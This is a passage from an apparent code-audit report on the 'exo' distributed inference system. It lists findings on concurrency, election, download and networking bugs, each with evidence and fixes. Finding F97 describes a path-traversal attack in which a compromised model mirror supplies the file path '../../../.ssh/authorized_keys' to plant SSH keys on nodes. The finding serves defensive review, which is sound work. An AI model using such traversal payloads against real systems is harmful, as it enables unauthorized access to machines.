**Fix.** Wrap the calls: `await anyio.to_thread.run_sync(functools.partial(list_models, search=..., author="mlx-community", sort="downloads", limit=limit))` and `await anyio.to_thread.run_sync(model_info, model_id)`; or replace with an aiohttp GET to `{get_hf_endpoint()}/api/models?search=...&author=...` using the existing `create_http_session(timeout_profile="short")`. Add a ruff/pyright lint or a test that fails if `huggingface_hub` sync functions are called outside a thread.

### F88 — zenoh session declares a required storage_manager plugin with 2 s replication and enables the adminspace, but nothing in exo uses either

*`rust/networking/src/lib.rs:39` — medium · effort S · finder-reported · lens `dead-code-drift` · confidence 0.75*

**Evidence.** rust/networking/src/lib.rs:35-50: `cfg.insert_json5("adminspace/enabled", "true")`, `cfg.insert_json5("plugins/storage_manager/__required__", "true")`, and a `storages/mem1` block `{ key_expr: "storage/mem1/**", volume: "memory", replication: { interval: 2 } }`; lib.rs:66-67 statically links `StoragesPlugin`. grep for `storage/`, `adminspace`, `storage_manager`, `@/` across src/exo, rust/networking/src and rust/exo_rs/src returns nothing outside lib.rs; the only example touching it (rust/networking/examples/serve_storage.rs) just subscribes `**`. All exo traffic uses `topics/{topic}` (swarm.rs:153, 165) and `live/{zid}` (swarm.rs:99-103). Cargo.toml:131-133 and rust/networking/Cargo.toml:65-67 pull `zenoh-plugin-storage-manager`, `zenoh-plugin-trait` and the `plugins`/`internal` features, plus the patched `zenoh_backend_traits` (Cargo.toml:169).

**Mechanism.** Every node runs a storage replication aligner that exchanges digests with peers every 2 s for a key space nobody writes to, on the same TCP links that carry per-token events. `__required__: true` means any failure to load the plugin aborts session creation — a startup-failure surface for a feature exo does not use. `adminspace/enabled` exposes runtime internals (`@/<zid>/router/**`: config, sessions, peers) to any peer on the mesh, which the architecture doc already notes is unauthenticated. The dependency set and the fork patch list are larger than needed for what is used.

**Fix.** Delete the storage_manager and adminspace lines from `cfg()` and the `plugins_manager(...)` / `StoragesPlugin` wiring in `open()`; drop `zenoh-plugin-storage-manager`, `zenoh-plugin-trait` and the `plugins` feature from rust/networking/Cargo.toml and the corresponding `[patch.crates-io]` entries. If the `serve_storage` example needs a storage, configure it inside the example. Confirm with `cargo tree -p networking` that the plugin crates are gone.

### F89 — Inline HuggingFace search effect re-fires on every 1 Hz poll, re-hitting /models/search (HF proxy) every second while a no-match query is typed, with a stale-response race

*`dashboard/src/lib/components/ModelPickerModal.svelte:232` — medium · effort S · finder-reported · lens `dashboard` · confidence 0.75*

**Evidence.** The `$effect` at 232-273 reads `filteredGroups.length`, clears and re-arms a 500 ms `setTimeout` that `fetch`es `/models/search?query=...` with no AbortController. `filteredGroups` (476-565) sorts by `getModelFitStatus(variant.id)` for every group. That prop is an inline arrow at +page.svelte:6755-6758 calling `getModelMemoryFitStatus` (1210-1220), which reads `availableMemoryGB()` — a `$derived` over `data.nodes[...].macmon_info.memory.ram_usage` (page.svelte:81 `const data = $derived(topologyData())`). `ram_usage` changes on every poll, so `filteredGroups` is recomputed each second. `searchHuggingFace` (289-311) and the inline path likewise have no sequence token; `hfIsSearching = false` in `finally` of whichever response lands first.

**Mechanism.** User opens the picker and types 'llama4' (no local match): the effect fires a fetch after 500 ms, then a second later the poll changes `filteredGroups`, the effect re-runs, spinner flips on, and another `/models/search` request goes to HuggingFace — indefinitely, one per second, for as long as the modal stays open. With two in-flight searches ('qwen' then 'qwen3'), the earlier one can resolve last and overwrite the results for the newer query.

**Fix.** Compute `const noLocalResults = $derived(filteredGroups.length === 0)` and `const query = $derived(searchQuery.trim())` and have the effect depend only on those primitives (or wrap the `filteredGroups` read in `untrack`). Give each search an AbortController stored in a local and abort it on the next keystroke; ignore responses whose query no longer equals the current one.

### F90 — Resume ignores the remote ETag: a .partial larger than the new upstream file triggers a 416 loop that is never cleared, and changed-content partials are only detected after a full download

*`src/exo/download/download_utils.py:706` — medium · effort M · finder-reported · lens `download` · confidence 0.75*

**Evidence.** download_utils.py:706-711: `resume_byte_pos = (await aios.stat(partial_path)).st_size if exists else None`; :712 `if resume_byte_pos != length:`; :715-716 `if resume_byte_pos: headers["Range"] = f"bytes={resume_byte_pos}-"`; :732-734 `assert r.status in [200, 206], (...)`; :735-737 `aiofiles.open(partial_path, "ab" if resume_byte_pos else "wb")` — a 200 reply to a Range request is appended. The partial is removed only on hash mismatch at :745-750, which is after the GET. AssertionError is retried 5x by the generic `except Exception` at :651-659. No etag/revision is persisted with the partial; coordinator.py:394-401 acknowledges 'main' is a moving target.

**Mechanism.** User has a 5 GB `.partial` of `model-00001-of-00003.safetensors`; the repo is re-uploaded as 2 shards and that filename is now 4 GB. `resume_byte_pos (5G) != length (4G)` -&gt; `Range: bytes=5368709120-` -&gt; 416 -&gt; assertion -&gt; five retries (~15 s of backoff) -&gt; DownloadFailed. Because the partial is never deleted, every subsequent attempt fails identically; the only remedy is Delete, which wipes all other downloaded shards too. Same-size-or-smaller partials from a changed upstream append new-version bytes onto old-version bytes and only fail the sha256 at the end, wasting the whole remaining transfer, and a mirror (HF_ENDPOINT) that ignores Range returns 200, which is appended in 'ab' mode and corrupts the file before the hash catches it.

**Fix.** Persist the etag next to the partial (e.g. `<path>.partial.etag` written before the first byte) and discard the partial when `file_meta` returns a different etag or when `resume_byte_pos > length`. When a Range header was sent require `r.status == 206` (truncate and restart on 200). Handle 416 explicitly by deleting the partial and retrying from zero rather than asserting. Add a unit test with a partial larger than the remote length.

### F91 — Runner crash mid-stream is covered by one synthetic private-method test; real process death, the 5 s watchdog and the exit-code-0 path are untested

*`src/exo/worker/runner/supervisor.py:378` — medium · effort M · finder-reported · lens `test-gaps` · confidence 0.75*

**Evidence.** test_runner_supervisor.py:39-97 injects a `_DeadProcess` (exitcode -6) and calls `supervisor._check_runner(RuntimeError("boom"))` directly. Not exercised: `_watch_runner` (supervisor.py:357-362, polls `is_alive()` every 5 s), `RunnerTerminationError` arriving on `_ev_recv` (:325-329), `cancel_task`'s pipe-blocked branch (:308-318), and the early return `if rc == 0: return` at :376-378 which skips the ErrorChunk fan-out (:406-421) and the RunnerFailed status (:423-434) for every task still in `in_progress`. test_async_process.py already has helpers `_exit_after_stdio_write`/`_abort_after_stdio_write` (:47-56) that could drive a real child.

**Mechanism.** If a runner process exits with code 0 while a TextGeneration is in flight (e.g. Shutdown processed while a stream is open, or the child's main loop returning because its task channel closed), no ErrorChunk is emitted and `self.shutdown()` is not called: the API's SSE stream for that request hangs until the client gives up, and the supervisor lingers with a stale status. Nothing in the suite exercises a real child dying, so a regression in the watchdog or the mp channel EOF handling would not fail any test.

**Fix.** Add tests in test_runner_supervisor.py using `RunnerSupervisor.create(...)` with a real `AsyncProcess` whose target sends TaskAcknowledged then (a) `os.abort()`, (b) `os._exit(0)`: assert an ErrorChunk with the task's command_id and a RunnerStatusUpdated(RunnerFailed) reach the event channel within a bounded `fail_after`, and that `pending` events are set. For (b) this documents the currently missing behaviour; change :376-378 to still fan out ErrorChunks when `in_progress` is non-empty. Add a `_watch_runner` test with `initialize_timeout`/poll interval monkeypatched to 0.05 s.

### F92 — Linux CPU install pairs mlx 0.32.0 Python bindings with mlx-cpu 0.31.2 libmlx, violating the fork's own `mlx-cpu=={version}` requirement

*`pyproject.toml:62` — medium · effort S · verified · lens `build-deps` · confidence 0.75*

**Evidence.** pyproject.toml:51 `"mlx==0.32.0"` and :62 `mlx-cpu = ["exo[mlx]", "mlx-cpu==0.31.2; sys_platform == 'linux'"]` while :65/:70 pin `mlx-cuda-12==0.32.0` / `mlx-cuda-13==0.32.0`. uv.lock:1438-1444 resolves `mlx-cpu 0.31.2` from PyPI; uv.lock:1386-1400 the 0.32.0 URL wheel's metadata says `{ name = "mlx-cpu", marker = "... extra == 'cpu'", specifier = "==0.32.0" }`. The fork's setup.py: `extras["cpu"] = [f'mlx-cpu=={version}; platform_system == "Linux"']`. Commit 4466cd5 previously had matched pairs (`mlx==0.31.1` + `mlx-cpu==0.31.1`) and bumped only mlx. PyPI lists mlx-cpu 0.32.0, 0.32.1, 0.32.2. python/parts.nix:128-135 copies `${final.mlx-cpu}/.../mlx` into the mlx package so nix `packages.exo` on Linux ships the same mismatch.

**Mechanism.** `uv sync --extra mlx-cpu` on Linux (README:193) or `nix run .#exo` on x86_64/aarch64-linux installs `mlx/core.cpython-313-*.so` built against MLX 0.32.0 headers while `mlx/lib/libmlx.so` is 0.31.2; MLX's C++ ABI changes every minor release, so `import mlx.core` fails with an undefined-symbol error or, worse, links but misbehaves on changed struct layouts. Because pipeline.yml runs pytest only on macOS (:107), neither CI nor `nix flake check` can observe this.

**Fix.** Pin `mlx-cpu==0.32.0` (or declare the extra as `exo[mlx]` + `mlx[cpu]==0.32.0` so the fork's metadata enforces equality), and add a Linux import smoke test (`python -c 'import mlx.core; mlx.core.zeros(1)'`) to the nix checks so the pairing is verified on every PR.

### F93 — Commands carry no SessionId, so a master executes requests from nodes that are following a different session and the requester never sees the result

*`src/exo/shared/types/commands.py:125` — medium · effort M · finder-reported · lens `control-plane` · confidence 0.70*

**Evidence.** commands.py:125-127 `class ForwarderCommand(FrozenModel): origin: SystemId; command: Command` — no session. master/main.py:172-175 `_command_processor` executes every command from `command_receiver` unconditionally, whereas `_event_processor` (495-497) and `EventRouter._run_ext_in` (120-123) both discard cross-session traffic. COMMANDS is `PublishPolicy.Always` (topics.py:42) so every running Master receives every command. api/main.py:2045-2048 `_send` only waits on `self.paused`.

**Mechanism.** Nodes finish an election round at different moments (up to the 3 s window skew), and in the split-brain of the previous finding they never agree. A `TextGeneration`/`ImageGeneration`/`PlaceInstance` sent from node X in that window is executed by a master whose session X's EventRouter filters out: the task runs on GPUs, but X never receives `TaskCreated`/`ChunkGenerated`, so the client's HTTP request hangs until its own timeout. With two masters both execute the same `PlaceInstance`, creating duplicate instances. `RequestEventLog` from a stale-session node is also served with the wrong log.

**Fix.** Add `session: SessionId` to `ForwarderCommand`; the master drops `command.session != self.session_id` with a warning; API and Worker stamp the session they were built for (the API receives it via `reset()`/`ElectionResult`) and the API returns 503 or holds requests while its session is being replaced. Add a master test that a command with a foreign session is ignored.

### F94 — Sliding-window (RotatingKVCache) layers are serialised for disaggregated prefill by raw buffer slicing, ignoring rotation/over-allocation

*`src/exo/worker/engines/mlx/disaggregated/adapter.py:117` — medium · effort S · finder-reported · lens `mlx-engine` · confidence 0.70*

**Evidence.** adapter.py:106-118 handles `KVCache() | RotatingKVCache()` identically: `offset = int(c.offset)` ... `k = mx.array(keys[:, :, start_pos:offset, :])`. For a RotatingKVCache the buffer is not indexed by absolute position: after `_update_concat` it holds at most `max_size + S - 1` entries (mlx_lm cache.py:449-467) and after in-place steps it is a ring indexed by `_idx` (469-510), so `offset` can exceed `keys.shape[2]` and the slice is truncated and/or out of temporal order. The mismatch is only logged (135-138 `logger.critical("Unexpected number of tokens sent ...")`) and the stream continues; the receiver then sets `cache._idx = k_bhsd.shape[2]` and `offset=final_offset` derived from other layers (adapter.py:193-204, client.py:112-116). Other unsupported cache types raise `NotImplementedError` (104-105).

**Mechanism.** Any model with sliding-window layers (gpt-oss, Gemma, Step3.5, DeepSeek V4 local windows) whose remote-prefilled prompt is longer than the window ends up with a sliding cache that is shorter than its offset and possibly rotated, while the receiver treats it as a contiguous temporal buffer. Attention over those layers is silently wrong; the `critical` log is the only signal and the request still completes.

**Fix.** Serialise RotatingKVCache the way `BatchRotatingKVCache.merge` does (`c._temporal_order(c.keys)[..., -c.size():, :]`), ship the window with its absolute `offset`, and on ingest set `keys`, `offset` and `_idx = keys.shape[2]` from that; when `offset > max_size` the `start_pos` skip must be computed against window positions, not absolute ones. Until then, raise `NotImplementedError` for RotatingKVCache like the other unsupported types instead of logging and continuing, and turn the token-count mismatch into an error that makes the client fall back to local prefill.

### F95 — TaskFinished is sent from a finally block inside a cancelled scope, so every client disconnect leaks the task (with its full prompt/images) into replicated cluster state forever; nothing reaps terminal tasks

*`src/exo/api/main.py:787` — medium · effort S · finder-reported · lens `resilience` · confidence 0.70*

**Evidence.** api/main.py:776-790 `_token_chunk_stream`: `except anyio.get_cancelled_exc_class(): ... with anyio.CancelScope(shield=True): await self.command_sender.send(...TaskCancelled...); raise` then `finally: await self._send(TaskFinished(finished_command_id=command_id))` — the `finally` is NOT shielded. `_send` (:2040-2045) does `while self.paused: await self.paused_ev.wait()` then `await self.command_sender.send(...)`; anyio's `MemoryObjectSendStream.send` begins with `await checkpoint()` (.venv anyio/streams/memory.py), which re-raises the cancellation, so `TaskFinished` is never sent and `del self._text_generation_queues[command_id]` (:789) is skipped. Same shape at :1199-1209 and :1285-1295 for images. The master deletes tasks only on `TaskFinished` (master/main.py:419-425 -&gt; `TaskDeleted`), and `apply_task_deleted` (apply.py) is the only path that removes from `state.tasks`. Master `_plan` :474-481 emits `InstanceDeleted` directly, bypassing `get_transition_events` (placement.py:325-362), so node-loss deletions never cancel tasks either. plan.py:346-362 `_cancel_tasks` re-issues `CancelTask` for every Cancelled task whenever a fresh supervisor (empty `runner.cancelled`) appears for that instance.

**Mechanism.** A user aborts a streaming chat (Ctrl-C, closed tab, HTTP timeout). Starlette cancels the response task; `TaskCancelled` goes out (shielded) but `TaskFinished` does not. The `TextGeneration` task — including the entire prompt and any base64 images — stays in `state.tasks` on every node and in `Master.command_task_mapping`, forever, and is written to every node's event log. Over days of use with impatient clients, memory grows on all nodes; when a runner for that instance is re-created, the worker spends one 100 ms plan tick per stale task emitting useless `CancelTask`s (and `TaskCreated` events) before it gets to `_create_runner`.

**Fix.** Move the `TaskFinished` send into the same `with anyio.CancelScope(shield=True):` block as the cancellation path (or wrap the `finally` body in a shielded scope) in all three stream helpers, and make `_send` tolerate being called from a cancelled scope. Defense in depth: have `Master._plan` reap tasks in terminal states (`Complete`, `Cancelled`, `Failed`, `TimedOut`) older than a few minutes by emitting `TaskDeleted`, and route `_plan`'s node-loss deletions through `get_transition_events` so tasks are cancelled consistently.

### F96 — Node loss is detected only by a 30 s last_seen reaper on a 10 s tick, then needs another tick for InstanceDeleted; the router's immediate disconnect signal is ignored and the dead node's runner statuses are never cleared, so the master keeps routing to the broken instance for ~50 s

*`src/exo/master/main.py:486` — medium · effort M · finder-reported · lens `resilience` · confidence 0.70*

**Evidence.** master/main.py:483-490: `if now - time > timedelta(seconds=30): ... NodeTimedOut` inside a `while True: ... await anyio.sleep(10)` loop; the `InstanceDeleted` check (:474-481) runs on `self.state.topology.list_nodes()` which only loses the node after `apply_node_timed_out` has been indexed, i.e. on the following 10 s tick. apply.py:288-345 `apply_node_timed_out` removes `topology`, `last_seen`, `downloads` and the `node_*` maps but not `runners` or `prefill_server_ports`, so the dead node's last `RunnerReady`/`RunnerRunning` persists. master/main.py:191-208 selects the target instance purely from `state.instances`/`state.tasks`, and plan.py:339-343 `_pending_tasks` dispatches when every runner in `all_runners` is `RunnerReady|RunnerRunning` — both keep passing for the dead node. The Router already delivers `ConnectionMessage(connected=False)` immediately (consumed by election.py:159-161) but the Master has no receiver for it.

**Mechanism.** Node B (holding half a pipeline) is unplugged. For 30-50 s the master still lists the instance as healthy, `_validate_model_has_instance` passes, new requests are assigned to it, and node A's runner (stuck in a collective) is handed those tasks — which, per the supervisor finding, then wedges A's planner. Users see every request to that model hang behind keep-alives during the window, then silently truncate. Recovery of the model afterwards is manual (re-place).

**Fix.** Give the Master a receiver for CONNECTION_MESSAGES (it already has one for COMMANDS/LOCAL_EVENTS) and on `connected=False` for a node in `topology`, run the reaper immediately (emit `NodeTimedOut` after a short grace period such as 5 s rather than 30 s, and emit `InstanceDeleted` for its instances in the same pass instead of waiting for the next tick). In `apply_node_timed_out`, drop `runners` and `prefill_server_ports` entries whose runner ids belong to the removed node's instances so stale Ready statuses cannot pass `_pending_tasks`. Route the deletions through `get_transition_events` so in-flight tasks are cancelled.

### F97 — File paths from the HF tree listing are used as local write targets without traversal checks, and the integrity hash comes from the same server; unsafe when HF_ENDPOINT is a mirror

*`src/exo/download/download_utils.py:673` — medium · effort S · finder-reported · lens `security` · confidence 0.70*

**Evidence.** `_fetch_file_list` (download_utils.py:487-525) builds `api_url = f"{get_hf_endpoint()}/api/models/{model_id}/tree/{revision}"` and appends every `item.type == "file"` entry's `path` verbatim (515). `_download_file` then does `target_path = target_dir / path` (673), `await aios.makedirs((target_dir / path).parent, exist_ok=True)` (703), streams into `partial_path = target_dir / f"{path}.partial"` and finally `await aios.rename(partial_path, target_dir / path)` (754). The 'integrity' check compares against `remote_hash = etag[...]` obtained from the same endpoint's HEAD response (705, `file_meta` 600-640). `get_hf_endpoint()` is `os.environ.get("HF_ENDPOINT", "https://huggingface.co")` (huggingface_utils.py:66-67) and nothing warns when it is `http://`.

**Mechanism.** Operators in regions where huggingface.co is blocked routinely set `HF_ENDPOINT=https://hf-mirror.com` (or a plain-http internal mirror). A compromised or MITM'd mirror returns a tree entry `{"type":"file","path":"../../../.ssh/authorized_keys","size":...}`; `makedirs` creates the parent, the body is written to `<models_dir>/<model>/../../../.ssh/authorized_keys.partial` and renamed into place with a matching attacker-supplied ETag, giving code execution on every node that downloads that model. `StartDownload` with an arbitrary `shard_metadata.model_card.model_id` is unauthenticated (main.py:2055-2062), so the attacker can also pick which repo is fetched.

**Fix.** In `_fetch_file_list`, drop entries where `PurePosixPath(path).is_absolute()` or any part is `..` (log a warning). In `_download_file`, assert `(target_dir / path).resolve().is_relative_to(target_dir.resolve())` before `makedirs`, and the same for `partial_path`. Log a startup warning when `HF_ENDPOINT` does not start with `https://`. Add unit tests with a fake tree listing containing `../` entries.

### F98 — Client disconnect skips TaskFinished and leaks the command's queue entry

*`src/exo/api/main.py:786` — medium · effort S · merged into F95 · lens `api-compat` · confidence 0.70*

Duplicate of F95, kept for readers arriving from the `api-compat` lens.

**Evidence.** _token_chunk_stream (main.py:766-789): on cancellation it sends TaskCancelled under `anyio.CancelScope(shield=True)` (779-785) then re-raises; the `finally` runs `await self._send(TaskFinished(...))` (787) unshielded and only afterwards `del self._text_generation_queues[command_id]` (788-789). `_send` awaits `self.command_sender.send(...)` (2045-2047), which is anyio's MemoryObjectSendStream.send and begins with `await checkpoint()`; inside the still-cancelled request scope that checkpoint raises again, so line 788-789 never executes. Master converts TaskFinished into TaskDeleted (master/main.py:419-425) and TaskCancelled only into TaskStatusUpdated(Cancelled) (403-418). Streams are consumed inside Starlette's per-request task group (hypercorn advertises asgi spec_version 2.1, http_stream.py:90), which cancels the body task on disconnect. Same pattern at 1206-1209 and 1292-1295 for image streams; channel() defaults to `max_buffer_size=inf` (channels.py:431).

**Mechanism.** A client that disconnects mid-generation (browser tab closed, SDK timeout) leaves a stale, still-open Sender in `_text_generation_queues`; `_apply_state` (1985-1992) keeps pushing subsequent ChunkGenerated events into its unbounded buffer, `POST /v1/cancel/{command_id}` (738-755) reports "Command cancelled." for a request that has no consumer, and the task is never TaskDeleted through the normal finished path.

**Fix.** In the `finally`, pop the queue first and shield the cleanup send: `self._text_generation_queues.pop(command_id, None); with anyio.CancelScope(shield=True): await self._send(TaskFinished(...))`. Apply the same change to _generate_image_stream and _collect_image_chunks. Add a test that cancels the consuming task and asserts the dict is empty and TaskFinished was sent.

### F99 — Discovery loop awaits connect_peer serially, so one unreachable peer stalls discovery and replies for up to open_timeout

*`rust/networking/src/lib.rs:97` — medium · effort S · finder-reported · lens `rust-transport` · confidence 0.70*

**Evidence.** lib.rs:76-101 is a single task: `loop { let Ok(discovered) = discovery.next().await ...; runtime.connect_peer(&discovered.zid.into(), &[locator]).await; }`. zenoh's Runtime::connect (orchestrator.rs:945-1050, vendored checkout) calls `manager.open_transport_unicast(endpoint).await` per locator, bounded by `transport/unicast/open_timeout: 10000` ms (DEFAULT_CONFIG.json5:540). While connect_peer is pending, `discovery.next()` is not polled, so neither the 1 s `announce()` tick (discovery.rs:124-126) nor `respond()` runs. discovery.rs:242-243 rotates `last_nonce` on every announce and discovery.rs:212-215 drops any WhatsUp whose nonce is not the latest (`dropped: stale nonce`). discovery.rs:186-202 additionally sleeps 300 ms up to five times inside the same loop when a reply send fails.

**Mechanism.** A single LAN peer whose TCP 52414 is firewalled (or whose WhatsUp advertises a stale address) is re-discovered every second and each attempt parks the loop for up to 10 s. During that window this node sends no Hellos and answers no Hellos, so peers waiting on its WhatsUp get it late and discard it as stale. Cluster formation degrades from ~1 s to tens of seconds, and a node that appears reachable over UDP but not TCP degrades discovery for everyone that sorts higher than it.

**Fix.** Spawn the dial instead of awaiting it: `tokio::spawn({ let runtime = runtime.clone(); async move { runtime.connect_peer(&zid.into(), &[locator]).await; } })` (zenoh already dedups concurrent attempts via insert_pending_connection), and keep a per-zid `HashMap<ZenohId, Instant>` backoff so a failing peer is retried at most every N seconds. Move the WhatsUp reply retry (discovery.rs:186-202) into a spawned task as well.

### F100 — Publisher put() with CongestionControl::Block runs inside the single swarm loop and parks inbound delivery for up to 5 s

*`rust/networking/src/swarm.rs:122` — medium · effort M · finder-reported · lens `rust-transport` · confidence 0.65*

**Evidence.** on_message (swarm.rs:116-128) does `Some(topic) => topic.1.put(data).await` inside the `tokio::select!` loop that also services `from_topics.recv()` and `discovery.recv_async()` (swarm.rs:59-88). Publishers are declared with `.congestion_control(CongestionControl::Block)` (154). In the vendored zenoh, `PublicationBuilder::into_future` is `std::future::ready(self.wait())` (publisher.rs:534-541), i.e. the push is synchronous, and push_network_message waits on a condvar-style `deadline.wait(&self.s_ref)` when no batch is free (pipeline.rs:316-319); for Block the deadline is `wait_before_close: 5000000` µs (DEFAULT_CONFIG.json5:648-652). Python's publish pump (router.py:221-229) awaits the oneshot result of each publish, and every TopicRouter._send_out funnels into it.

**Mechanism.** When a peer disappears without FIN (Wi-Fi drop, sleep) its link tx queue fills; the next put to that topic blocks the tokio worker thread synchronously for up to 5 s. For that window the loop cannot yield inbound messages, liveliness Discovered/Expired, or subscribe/unsubscribe results, and every outbound topic on the node (including ELECTION_MESSAGES with a 3 s round) is queued behind it. That is long enough to miss an election round and provoke a re-election, which in main.py:180-270 tears down and recreates Worker/EventRouter/API.

**Fix.** Take puts off the control loop: spawn each publish (`tokio::spawn(async move { let r = publisher.put(data).await; _ = result_sender.send(r); })`, keeping Publisher in an Arc) or run a dedicated per-topic publish task fed by a channel. Use `CongestionControl::Drop` (with `express(true)`) for ELECTION_MESSAGES/CONNECTION_MESSAGES which are re-sent every round anyway, and keep Block only for event/command topics.

### F101 — Two election campaigns can run concurrently when two rounds are queued in the same loop iteration, emitting a spurious self-election before the real result

*`src/exo/shared/election.py:198` — medium · effort S · finder-reported · lens `control-plane` · confidence 0.60*

**Evidence.** election.py:192-203: `if self._campaign_cancel_scope: cancel(); if self._campaign_done: await self._campaign_done.wait()` runs before `self._campaign_cancel_scope = scope` (203). `_campaign_done` is never reset to None, so every campaign awaits an already-set `Event`, which in anyio is a checkpoint (a yield) — a second campaign task started in the same iteration passes the same preamble before either installs its scope. `_connection_receiver` (176) and `_election_receiver` (146) are separate tasks that each call `self._tg.start_soon(self._campaign, ...)`. Harness driving two `start_soon(_campaign)` calls in one iteration on a node whose `current_session` was master P produced results `[('A', 5, True), ('P', 5, True)]`.

**Mechanism.** When the 0.2 s connection-receiver timer and a peer's higher-clock message are processed in the same asyncio iteration, both campaigns run for the full window and both call `elect()`. The first result (built from the stale candidate list, typically only this node's own status) reaches `_elect_loop` (main.py:195-275) which tears down the EventRouter, restarts Worker/DownloadCoordinator and promotes this node to Master; one tick later the second result demotes it and rebuilds everything again — two worker restarts, all local runners killed twice, and a bogus master briefly indexing events.

**Fix.** Make campaign hand-over synchronous: create `done`/`scope`, cancel the previous scope and assign the new ones before any `await` (drop the `wait()` or perform it after installation), so a later campaign always sees the earlier one's scope. Add a test that starts two campaigns in the same iteration and asserts exactly one ElectionResult.

### F102 — DownloadCoordinator swallows CancelledError and unconditionally pops active_downloads, so a cancel followed by the planner's automatic restart leaves the new download untracked or stuck

*`src/exo/download/coordinator.py:309` — medium · effort S · finder-reported · lens `concurrency` · confidence 0.60*

**Evidence.** coordinator.py:293-317: `async def download_wrapper(cancel_scope): try: with cancel_scope: await self.shard_downloader.ensure_shard(shard) except Exception ... except anyio.get_cancelled_exc_class(): pass finally: self.active_downloads.pop(model_id, None)`; then `self.active_downloads[model_id] = scope`. `_cancel_download` (175-195) cancels the scope and immediately publishes `DownloadPending`. plan.py:150-167 `_model_needs_download` re-issues `DownloadModel` as soon as the status is not Ongoing/Completed/Failed (backoff base 0.5 s, worker/main.py:96). impl_shard_downloader.py:70-81 `SingletonShardDownloader.ensure_shard` dedups on `shard` with a raw `asyncio.create_task` that is still cancelling while the old wrapper unwinds.

**Mechanism.** User cancels a download that a live instance still needs. Status flips to Pending, so within ~0.5 s the worker sends StartDownload again. `_start_download_task` registers a new scope in `active_downloads[model_id]` while the old wrapper is still awaiting the cancelling asyncio task (cancellation is only delivered at the downloader's next checkpoint, possibly after an `asyncio.to_thread`). Two outcomes: (a) the old wrapper's `finally` pops the NEW scope, so the new download runs untracked, `_cancel_download`/`_delete_download` can no longer cancel it (they check `model_id in self.active_downloads`) and `_emit_existing_download_progress` overwrites its progress; or (b) the new wrapper awaits the still-cancelling singleton task, receives a foreign `CancelledError`, which the bare `except get_cancelled_exc_class(): pass` swallows, and the status stays `DownloadOngoing` with no task running until the 60 s reconciler (coordinator.py:475) happens to fix it.

**Fix.** In `download_wrapper`'s `finally`, only remove the entry if it is still ours: `if self.active_downloads.get(model_id) is cancel_scope: del ...`. Remove the `except anyio.get_cancelled_exc_class(): pass` (re-raise, as anyio requires) and instead have `_start_download` refuse/await-then-retry while `model_id in self.active_downloads`, or make `_cancel_download` await the wrapper's completion (store an `anyio.Event` alongside the scope) before publishing Pending. Extend test_cancel_download.py with cancel-then-immediate-restart.

### F103 — macmon read timeout hangs in Process.aclose() instead of restarting, silently stopping memory telemetry

*`src/exo/utils/info_gatherer/info_gatherer.py:608` — medium · effort S · finder-reported · lens `concurrency` · confidence 0.60*

**Evidence.** info_gatherer.py:595-615: `async with await open_process([...]) as p: ... while True: with fail_after(read_timeout): data = await stream.receive_until(...)` followed by `except TimeoutError: logger.warning('MacMon produced no output ... restarting'); self._tg.start_soon(self._monitor_memory_usage, 1)`. The `TimeoutError` is raised inside the `async with`, so anyio's `Process.__aexit__` -&gt; `aclose()` runs first; anyio 4.11's `Process.aclose` closes the pipes and then `await self.wait()`s for natural exit, only killing the child if that wait is itself cancelled.

**Mechanism.** `macmon pipe` is a long-running child that never reads stdin. If it stops producing output (the exact condition the timeout was written for, e.g. stuck in an IOKit call), the monitor task blocks forever inside `aclose()` waiting for macmon to exit. The `except TimeoutError` branch that restarts macmon and starts the psutil fallback never executes, so the node stops publishing `MacmonMetrics` (memory pressure, GPU utilisation, power) without any error, and the master's placement keeps using stale memory numbers.

**Fix.** Kill the child before leaving the context on timeout: wrap the inner loop in `try: ... except TimeoutError: p.kill(); raise` (inside the `async with`), or replace `async with` by explicit `try/finally: p.kill(); await p.wait()`. The shutdown path is already correct because cancellation of `aclose()` triggers the kill.

### F104 — Every peer connect/disconnect starts a 3 s election round that pauses the API on every node; a link flapping faster than 3 s cancels each round before it resolves and stalls the whole cluster's API indefinitely

*`src/exo/shared/election.py:171` — medium · effort M · finder-reported · lens `resilience` · confidence 0.60*

**Evidence.** election.py:159-180 `_connection_receiver`: on any `ConnectionMessage` (connect or disconnect), `self.clock += 1` and `self._tg.start_soon(self._campaign, candidates, DEFAULT_ELECTION_TIMEOUT)` with `DEFAULT_ELECTION_TIMEOUT = 3.0` (:18). `_campaign` :192-198 cancels the previous campaign and waits for it; a cancelled campaign takes the `except get_cancelled_exc_class()` branch (:244-245) and never calls `elect()`, so no `ElectionResult` is produced. api/main.py:2027-2031 `_pause_on_new_election` sets `self.paused = True` on any election message with `clock > last_completed_election`; `_send` :2040-2045 spins on `paused_ev` before every command (chat, image, delete, cancel, TaskFinished). `unpause` is only called from `_elect_loop` (main.py:271, :275) on an `ElectionResult`. ELECTION_MESSAGES is published to every node, so a round started by B and C for their link reaches A and pauses A's API too.

**Mechanism.** A flaky Thunderbolt/Wi-Fi link between two worker nodes toggles every ~2 s. Each toggle bumps the clock and starts a fresh campaign that cancels the previous one; no round completes, so `last_completed_election` never advances and every API node stays paused: every `/v1/chat/completions` blocks in `_send` with no error and no timeout. Even a link that flaps once per minute imposes a 3.2 s full-cluster API stall per flap, although the incumbent master always wins and nothing else changes.

**Fix.** Only start a campaign when the connection change could change leadership — e.g. when the disconnected peer is the current `master_node_id`, or when a peer with unknown/higher seniority connects — and debounce connection messages (coalesce within a window, which `collect()` at :164 half-does but then starts a round anyway). Separately, decouple API pausing from round start: pause only when the master is unreachable, or cap the pause with a timeout after which `_send` raises a 503 "election in progress" instead of hanging. Add a test that feeds alternating connect/disconnect messages every 0.05 s for 2 s and asserts an `ElectionResult` still arrives.

### F105 — Transport is IPv6-only end to end with no manual join path, and the listener itself requires an IPv6 socket

*`rust/networking/src/lib.rs:31` — medium · effort M · finder-reported · lens `rust-transport` · confidence 0.60*

**Evidence.** lib.rs:31: `cfg.insert_json5("listen/endpoints", &format!("[\"tcp/[::]:{listen_port}\"]"))?;` is the only listener. Discovery binds an AF_INET6 socket (discovery.rs:46-54) to group `ff12::…` and `respond()` drops any reply that is not V6: `let SocketAddr::V6(v6) = addr else { trace!("dropped: v4 addr used"); return Ok(None); }` (216-219). No `connect/endpoints` is ever configured (lib.rs:23-52), and main.py:352-353 does `raise ValueError("Bootstrap peers has been temporarily removed")`. docs/architecture.md:107-109 acknowledges: "There is no IPv4 fallback … so there is no manual join escape hatch either."

